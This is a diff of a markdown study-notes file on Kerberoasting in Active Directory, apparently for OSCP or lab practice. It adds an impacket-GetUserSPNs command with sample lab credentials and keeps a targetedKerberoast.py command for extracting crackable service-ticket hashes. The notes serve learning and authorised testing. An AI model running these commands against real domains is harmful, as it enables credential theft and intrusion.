@@ -156,12 +156,19 @@ extract crackable hashes (no pre-auth users)
 impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request
 ```
 
+```zsh
+impacket-GetUserSPNs oscp.exam/r.andrews:Password123! -dc-ip 192.168.56.200 -request
+```
+
+![](../../assets/images/Pasted%20image%2020260602222817.png)
+
 ### Repository
 https://github.com/ShutdownRepo/targetedKerberoast
 ### Attack
 ```zsh
 python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.186.40
 ```
+
 ![](../../assets/images/Pasted%20image%2020260508214035.png)
 
 ### Crack
